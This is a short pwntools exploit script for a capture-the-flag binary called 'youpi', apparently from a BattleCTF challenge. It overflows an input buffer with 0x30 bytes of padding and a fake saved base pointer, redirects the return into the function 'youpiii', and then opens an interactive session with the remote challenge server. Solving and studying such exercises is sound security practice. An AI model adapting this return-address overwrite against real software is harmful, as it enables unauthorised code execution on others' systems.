#!/usr/bin/python3

from pwn import *

exe = ELF('youpi', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+56
                b*youpiii+18

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.battlectf.online', 1005)
else:
        p = process(exe.path)
pop_rbp = 0x000000000040115d
GDB()
payload = b"a" * 0x30 +p64(0x0000000000404040) + p64(exe.sym['youpiii'] + 18)
sla(b"country: \n", payload)
p.interactive()
